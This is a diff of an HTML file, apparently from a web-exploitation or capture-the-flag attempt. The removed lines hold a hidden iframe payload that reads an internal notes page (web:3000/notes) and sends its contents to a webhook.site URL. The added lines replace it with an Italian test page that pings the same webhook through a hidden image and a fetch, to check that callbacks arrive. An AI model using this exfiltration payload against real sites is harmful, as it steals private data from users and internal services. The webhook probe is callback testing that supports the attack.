@@ -1,7 +1,23 @@
-<iframe src="http://web:3000/notes" style="display:none" onload="
-  fetch(this.src)
-    .then(r => r.text())
-    .then(t => {
-      fetch('https://webhook.site/40aa731a-a2c1-447f-bc06-aae282f1b26e?data=' + encodeURIComponent(t));
-    });
-"></iframe>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <title>Test Webhook</title>
+</head>
+<body>
+  <h1>Test Webhook</h1>
+  <p>Se vedi questa pagina, il file è stato caricato.</p>
+
+  <!-- Immagine nascosta che richiama il webhook -->
+  <img src="https://webhook.site/40aa731a-a2c1-447f-bc06-aae282f1b26e/pixel" style="display:none" alt="">
+
+  <!-- Prova con JavaScript molto semplice -->
+  <script>
+    // Facciamo un semplice fetch e vediamo se arriva la richiesta
+    fetch('https://webhook.site/40aa731a-a2c1-447f-bc06-aae282f1b26e?test=ok')
+      .catch(() => {
+        // Ignora errori, può darsi che blocchi CORS o altro
+      });
+  </script>
+</body>
+</html>
